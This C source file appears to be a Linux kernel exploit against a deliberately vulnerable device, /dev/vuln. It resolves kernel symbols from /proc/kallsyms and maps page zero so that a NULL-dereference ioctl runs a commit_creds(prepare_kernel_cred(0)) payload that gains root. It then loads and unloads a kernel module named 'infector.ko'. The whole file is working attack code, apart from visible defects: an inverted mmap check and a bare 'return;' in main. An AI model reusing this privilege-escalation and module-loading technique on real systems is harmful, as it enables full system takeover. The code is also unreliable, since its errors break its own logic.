#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <limits.h>
#include <string.h>

#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#include <sys/syscall.h>
#include <sys/capability.h>

#include "vuln_ioctl.h"

struct cred;
struct task_struct;

static struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) __attribute__((regparm(3)));
static int (*commit_creds)(struct cred *new) __attribute__((regparm(3)));
static void (*printk)(const char*fmt, ...);

static inline int finit_module(int fd, const char *param_values, int flags)
{
	return syscall(SYS_finit_module, fd, param_values, flags);
}

void *get_ksym(char *name) {
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr, *found = NULL;

	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
		if (!strcmp(sym, name)) {
			found = addr;
			break;
		}
	}
	fclose(f);
	return found;
}

static unsigned long a_printk;

static void get_root(void)
{
	printk("PWNEED!!!\n");
	commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char **argv)
{
	int fd = open("/dev/vuln", O_RDWR);
	if (fd < 0) {
		perror("open dev failed:");
		return -1;
	}

	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
	commit_creds        = get_ksym("commit_creds");
	printk              = get_ksym("printk");

	void (**fn)(void) = mmap(0, 4096, PROT_READ|PROT_WRITE,
				 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if (fn != NULL) {
		perror("mmap: ");
		close(fd);
		return;
	}
	*fn = get_root;

	int ret = ioctl(fd, VULN_NULL_DEREFERENCE);
	close(fd);
	if (ret) {
		perror("vuln ioctl failed:");
		return ret;
	}

	char mod_path[PATH_MAX];
	strncpy(mod_path, argv[0], PATH_MAX);
	dirname(mod_path);
	strncat(mod_path, "/infector.ko", PATH_MAX);

	fd = open(mod_path,  O_RDONLY|O_CLOEXEC);
	if (fd < 0) {
		printf("can't open: %s\n", mod_path);
		perror("open 'infector.ko' failed:");
		return -1;
	}

	ret = finit_module(fd, "", 0);
	close(fd);
	if (ret < 0) {
		perror("finit_module failed:");
		return -1;
	}

	ret = delete_module("infector", argv[1], 0);
	if (ret < 0) {
		perror("delete_module failed:");
		return -1;
	}

	printf("success\n");

	return 0;
}
